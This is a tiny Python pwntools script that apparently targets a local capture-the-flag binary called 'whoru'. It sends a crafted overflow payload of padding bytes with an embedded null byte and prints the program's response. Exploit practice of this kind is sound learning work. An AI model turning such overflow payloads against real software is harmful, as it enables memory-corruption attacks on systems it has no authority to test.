from pwn import *

p = process("./whoru")

p.recv()

payload=b"A"*23+b"\x00"
payload+=b"B"*200

p.sendline(payload)

print(p.recv())
